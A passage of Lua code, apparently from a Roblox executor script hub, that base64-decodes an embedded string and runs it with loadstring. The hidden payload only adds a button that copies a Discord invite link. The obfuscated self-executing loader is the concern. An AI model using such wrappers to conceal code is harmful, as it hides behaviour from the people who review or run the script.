KQpDcmVkaXRzOkFkZExhYmVsKCJTTEggT2ZmaWNpYWwgRGlzY29yZCIpCgpDcmVkaXRzOkFkZEJ1dHRvbigiQ29weSBEaXNjb3JkIExpbmsiLCBmdW5jdGlvbigpCiAgICBsb2NhbCBsaW5rID0gImh0dHBzOi8vZGlzY29yZC5nZy9rbXdhVXRncUUiCiAgICAKICAgIGlmIHNldGNsaXBib2FyZCB0aGVuCiAgICAgICAgc2V0Y2xpcGJvYXJkKGxpbmspCiAgICAgICAgZ2FtZS5TdGFydGVyR3VpOlNldENvcmUoIlNlbmROb3RpZmljYXRpb24iLCB7CiAgICAgICAgICAgIFRpdGxlID0gIkxpbmsgQ29waWVkISIsCiAgICAgICAgICAgIFRleHQgPSAiWW91IGNhbiBjb250aW51ZSB0byBEaXNjb3JkIG5vdy4iLAogICAgICAgICAgICBEdXJhdGlvbiA9IDMKICAgICAgICB9KQogICAgZWxzZQogICAgICAgIGdhbWUuU3RhcnRlckd1aTpTZXRDb3JlKCJTZW5kTm90aWZpY2F0aW9uIiwgewogICAgICAgICAgICBUaXRsZSA9ICJFcnJvciEiLAogICAgICAgICAgICBUZXh0ID0gIkNsaXBib2FyZCBub3Qgc3VwcG9ydGVkLiIsCiAgICAgICAgICAgIER1cmF0aW9uID0gMwogICAgICAgIH0pCiAgICBlbmQKZW5kKQ==" local __map={};(function() local chars='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' for i=1,#chars do __map[string.sub(chars,i,i)]=i-1 end end)() local out={};local i=1;while i<=#__b do local c1=__map[string.sub(__b,i,i)];local c2=__map[string.sub(__b,i+1,i+1)];local c3=__map[string.sub(__b,i+2,i+2)];local c4=__map[string.sub(__b,i+3,i+3)];if not c1 then break end;c2=c2 or 0;c3=c3 or 0;c4=c4 or 0;local n=c1*262144+c2*4096+c3*64+c4;local b1=math.floor(n/65536)%256;local b2=math.floor(n/256)%256;local b3=n%256;out[#out+1]=string.char(b1);if string.sub(__b,i+2,i+2)~='=' then out[#out+1]=string.char(b2) end;if string.sub(__b,i+3,i+3)~='=' then out[#out+1]=string.char(b3) end;i=i+4 end;local decoded=table.concat(out) local ok,err=pcall(function() local loader=loadstring or load;local f=loader(decoded);if type(f)=='function'then f() end end) if not ok then pcall(function() print('Wrapper error: '..tostring(err)) end) end end)()